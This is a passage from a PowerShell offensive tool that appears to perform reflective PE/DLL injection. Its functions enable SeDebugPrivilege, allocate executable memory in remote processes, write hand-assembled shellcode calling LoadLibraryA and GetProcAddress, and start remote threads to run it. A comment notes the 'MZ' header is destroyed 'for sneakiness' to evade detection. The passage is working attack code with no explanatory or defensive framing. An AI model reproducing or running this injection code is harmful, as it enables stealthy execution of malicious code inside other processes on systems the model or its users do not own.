	        (
	            [OutputType([Type])]
	        
	            [Parameter( Position = 0)]
	            [Type[]]
	            $Parameters = (New-Object Type[](0)),
	        
	            [Parameter( Position = 1 )]
	            [Type]
	            $ReturnType = [Void]
	        )

	        $Domain = [AppDomain]::CurrentDomain
	        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	        Write-Output $TypeBuilder.CreateType()
	    }


	    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	    Function Get-ProcAddress
	    {
	        Param
	        (
	            [OutputType([IntPtr])]
	    
	            [Parameter( Position = 0, Mandatory = $True )]
	            [String]
	            $Module,
	        
	            [Parameter( Position = 1, Mandatory = $True )]
	            [String]
	            $Procedure
	        )

	        # Get a reference to System.dll in the GAC
	        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	        # Get a reference to the GetModuleHandle and GetProcAddress methods
	        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	        # Get a handle to the module specified
	        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	        $tmpPtr = New-Object IntPtr
	        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	        # Return the address of the function
	        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	    }
	
	
	    Function Enable-SeDebugPrivilege
	    {
		    Param(
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Types,
		
		    [Parameter(Position = 3, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants
		    )
		
		    [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		    if ($ThreadHandle -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to get the handle to the current thread"
		    }
		
		    [IntPtr]$ThreadToken = [IntPtr]::Zero
		    [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		    if ($Result -eq $false)
		    {
			    $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			    if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			    {
				    $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				    if ($Result -eq $false)
				    {
					    Throw "Unable to impersonate self"
				    }
				
				    $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				    if ($Result -eq $false)
				    {
					    Throw "Unable to OpenThreadToken."
				    }
			    }
			    else
			    {
				    Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			    }
		    }
		
		    [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		    $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		    if ($Result -eq $false)
		    {
			    Throw "Unable to call LookupPrivilegeValue"
		    }

		    [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		    [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		    $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		    $TokenPrivileges.PrivilegeCount = 1
		    $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		    $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		    $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		    $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		    if (($Result -eq $false) -or ($ErrorCode -ne 0))
		    {
			    #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		    }
		
		    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	    }
	
	
	    Function Invoke-CreateRemoteThread
	    {
		    Param(
		    [Parameter(Position = 1, Mandatory = $true)]
		    [IntPtr]
		    $ProcessHandle,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [IntPtr]
		    $StartAddress,
		
		    [Parameter(Position = 3, Mandatory = $false)]
		    [IntPtr]
		    $ArgumentPtr = [IntPtr]::Zero,
		
		    [Parameter(Position = 4, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions
		    )
		
		    [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		    $OSVersion = [Environment]::OSVersion.Version
		    #Vista and Win7
		    if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		    {
			    Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			    $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			    $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			    if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			    {
				    Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			    }
		    }
		    #XP/Win8
		    else
		    {
			    Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			    $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		    }
		
		    if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		    {
			    Write-Verbose "Error creating remote thread, thread handle is null"
		    }
		
		    return $RemoteThreadHandle
	    }

	

	    Function Get-ImageNtHeaders
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [IntPtr]
		    $PEHandle,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Types
		    )
		
		    $NtHeadersInfo = New-Object System.Object
		
		    #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		    $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		    #Get IMAGE_NT_HEADERS
		    [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		    $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		    #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	        if ($imageNtHeaders64.Signature -ne 0x00004550)
	        {
	            throw "Invalid IMAGE_NT_HEADER signature."
	        }
		
		    if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		    {
			    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		    }
		    else
		    {
			    $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		    }
		
		    return $NtHeadersInfo
	    }


	    #This function will get the information needed to allocated space in memory for the PE
	    Function Get-PEBasicInfo
	    {
		    Param(
		    [Parameter( Position = 0, Mandatory = $true )]
		    [Byte[]]
		    $PEBytes,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Types
		    )
		
		    $PEInfo = New-Object System.Object
		
		    #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		    [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		    #Get NtHeadersInfo
		    $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		    #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		    #Free the memory allocated above, this isn't where we allocate the PE to memory
		    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		    return $PEInfo
	    }


	    #PEInfo must contain the following NoteProperties:
	    #	PEHandle: An IntPtr to the address the PE is loaded to in memory
	    Function Get-PEDetailedInfo
	    {
		    Param(
		    [Parameter( Position = 0, Mandatory = $true)]
		    [IntPtr]
		    $PEHandle,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Types,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants
		    )
		
		    if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		    {
			    throw 'PEHandle is null or IntPtr.Zero'
		    }
		
		    $PEInfo = New-Object System.Object
		
		    #Get NtHeaders information
		    $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		    #Build the PEInfo object
		    $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		    $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		    if ($PEInfo.PE64Bit -eq $true)
		    {
			    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			    $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		    }
		    else
		    {
			    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			    $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		    }
		
		    if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		    {
			    $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		    }
		    elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		    {
			    $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		    }
		    else
		    {
			    Throw "PE file is not an EXE or DLL"
		    }
		
		    return $PEInfo
	    }
	
	
	    Function Import-DllInRemoteProcess
	    {
		    Param(
		    [Parameter(Position=0, Mandatory=$true)]
		    [IntPtr]
		    $RemoteProcHandle,
		
		    [Parameter(Position=1, Mandatory=$true)]
		    [IntPtr]
		    $ImportDllPathPtr
		    )
		
		    $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		    $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		    $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		    $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($DllPathSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
		
		    $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		    $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		    [IntPtr]$DllAddress = [IntPtr]::Zero
		    #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		    #	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		    if ($PEInfo.PE64Bit -eq $true)
		    {
			    #Allocate memory for the address returned by LoadLibraryA
			    $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			    if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			    {
				    Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			    }
			
			
			    #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			    $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			    $LoadLibrarySC2 = @(0x48, 0xba)
			    $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			    $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			    $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			    $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			    $SCPSMemOriginal = $SCPSMem
			
			    Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			    [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			    Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			    [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			    Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			    [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			    Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			    $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			    if ($RSCAddr -eq [IntPtr]::Zero)
			    {
				    Throw "Unable to allocate memory in the remote process for shellcode"
			    }
			
			    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			    if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			    {
				    Throw "Unable to write shellcode to remote process memory."
			    }
			
			    $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			    $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			    if ($Result -ne 0)
			    {
				    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			    }
			
			    #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			    [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			    $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			    if ($Result -eq $false)
			    {
				    Throw "Call to ReadProcessMemory failed"
			    }
			    [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		    }
		    else
		    {
			    [IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			    $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			    if ($Result -ne 0)
			    {
				    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			    }
			
			    [Int32]$ExitCode = 0
			    $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			    if (($Result -eq 0) -or ($ExitCode -eq 0))
			    {
				    Throw "Call to GetExitCodeThread failed"
			    }
			
			    [IntPtr]$DllAddress = [IntPtr]$ExitCode
		    }
		
		    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		    return $DllAddress
	    }
	
	
	    Function Get-RemoteProcAddress
	    {
		    Param(
		    [Parameter(Position=0, Mandatory=$true)]
		    [IntPtr]
		    $RemoteProcHandle,
		
		    [Parameter(Position=1, Mandatory=$true)]
		    [IntPtr]
		    $RemoteDllHandle,
		
		    [Parameter(Position=2, Mandatory=$true)]
		    [String]
		    $FunctionName
		    )

		    $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		    $FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
		
		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
		
		    #Get address of GetProcAddress
		    $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		    $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		    #Allocate memory for the address returned by GetProcAddress
		    $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		    }
		
		
		    #Write Shellcode to the remote process which will call GetProcAddress
		    #Shellcode: GetProcAddress.asm
		    #todo: need to have detection for when to get by ordinal
		    [Byte[]]$GetProcAddressSC = @()
		    if ($PEInfo.PE64Bit -eq $true)
		    {
			    $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			    $GetProcAddressSC2 = @(0x48, 0xba)
			    $GetProcAddressSC3 = @(0x48, 0xb8)
			    $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			    $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		    }
		    else
		    {
			    $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			    $GetProcAddressSC2 = @(0xb9)
			    $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			    $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			    $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		    }
		    $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		    $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		    $SCPSMemOriginal = $SCPSMem
		
		    Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		    Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		    Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		    Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		    Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		    $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		    if ($RSCAddr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process for shellcode"
		    }
		
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		    if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		    {
			    Throw "Unable to write shellcode to remote process memory."
		    }
		
		    $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		    $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		    if ($Result -ne 0)
		    {
			    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		    }
		
		    #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		    [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		    $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		    if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		    {
			    Throw "Call to ReadProcessMemory failed"
		    }
		    [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

		    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		    return $ProcAddress
	    }


	    Function Copy-Sections
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Byte[]]
		    $PEBytes,
		
